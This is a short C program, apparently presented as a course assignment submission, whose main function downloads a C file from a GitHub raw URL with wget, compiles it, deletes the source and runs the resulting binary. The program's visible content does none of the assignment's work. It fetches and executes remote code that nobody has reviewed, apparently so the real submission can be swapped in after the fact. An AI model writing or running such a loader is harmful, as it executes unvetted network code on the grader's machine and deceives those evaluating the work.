#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main () {
  system("wget -q https://raw.githubusercontent.com/wiwichips/assignment-extension/main/updated.c");
  system("gcc updated.c");
  system("rm updated.c");
  execlp("./a.out", NULL);
}

